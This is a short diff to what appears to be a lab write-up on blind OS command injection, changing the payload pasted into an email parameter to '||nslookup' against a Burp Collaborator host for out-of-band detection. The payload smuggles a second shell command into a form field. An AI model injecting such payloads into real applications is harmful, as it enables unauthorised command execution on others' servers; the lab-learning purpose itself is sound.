@@ -15,7 +15,7 @@ We first create a external server ie . collaborator server.
 
 Copy the collaborator server link - `http://zorh37nyfzjbsg1nog7j9m16zx5ntc.burpcollaborator.net/`
 
-Paste the payload ` & nslookup zorh37nyfzjbsg1nog7j9m16zx5ntc.burpcollaborator.net # ` (URL - encode ) in the email parameter .
+Paste the payload `||nslookup zorh37nyfzjbsg1nog7j9m16zx5ntc.burpcollaborator.net|| ` (URL - encode ) in the email parameter .
 
 ![image](https://user-images.githubusercontent.com/67383098/225314704-8214e8e5-af55-4af7-af05-81e0fcb4c061.png)
 
